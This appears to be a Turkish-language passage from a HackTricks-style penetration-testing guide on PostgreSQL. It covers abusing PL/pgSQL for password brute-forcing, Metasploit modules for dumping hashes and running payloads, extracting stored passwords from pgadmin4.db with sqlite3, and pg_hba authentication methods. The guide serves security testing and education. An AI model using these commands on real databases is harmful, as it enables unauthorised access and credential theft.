**PL/pgSQL**, SQL'ye kıyasla daha fazla prosedürel kontrol sunan **tam özellikli bir programlama dili**dir. Program mantığını geliştirmek için **döngüler** ve diğer **kontrol yapıları** kullanmayı mümkün kılar. Ayrıca, **SQL ifadeleri** ve **tetikleyiciler**, **PL/pgSQL dilini** kullanarak oluşturulan fonksiyonları çağırma yeteneğine sahiptir. Bu entegrasyon, veritabanı programlaması ve otomasyonu için daha kapsamlı ve esnek bir yaklaşım sağlar.\
**PostgreSQL'e kullanıcı kimlik bilgilerini brute-force yapması için bu dili istismar edebilirsiniz.**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md" %}
[pl-pgsql-password-bruteforce.md](../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md)
{% endcontent-ref %}

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### günlükleme

_**postgresql.conf**_ dosyasının içinde, postgresql günlüklerini etkinleştirebilirsiniz. Bunun için aşağıdaki adımları izleyin:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
Ardından, **hizmeti yeniden başlatın**.

### pgadmin

[pgadmin](https://www.pgadmin.org), PostgreSQL için bir yönetim ve geliştirme platformudur.\
Parolaları _**pgadmin4.db**_ dosyasının içinde bulabilirsiniz.\
Onları şu betik içindeki _**decrypt**_ işlevini kullanarak şifreleyebilirsiniz: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg\_hba

PostgreSQL'de istemci kimlik doğrulaması **pg_hba.conf** adlı bir yapılandırma dosyası aracılığıyla yönetilir. Bu dosya, bağlantı türünü, istemci IP adresi aralığını (uygulanabilirse), veritabanı adını, kullanıcı adını ve eşleşen bağlantılar için kullanılacak kimlik doğrulama yöntemini belirten bir dizi kayıt içerir. Bağlantı türü, istemci adresi, istenen veritabanı ve kullanıcı adıyla eşleşen ilk kayıt kimlik doğrulaması için kullanılır. Kimlik doğrulaması başarısız olursa geriye dönüş veya yedekleme yoktur. Eşleşen hiçbir kayıt yoksa erişim reddedilir.

pg_hba.conf'deki mevcut şifre tabanlı kimlik doğrulama yöntemleri **md5**, **crypt** ve **password**'dır. Bu yöntemler, şifrenin nasıl iletildiğinde farklılık gösterir: MD5 karma, crypt şifreli veya açık metin. Crypt yöntemi, pg_authid'de şifrelenmiş olan şifrelerle kullanılamaz.

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>'ı öğrenin!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek** paylaşın.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Dünyanın en gelişmiş topluluk araçları tarafından desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin** için [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)'i kullanın.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
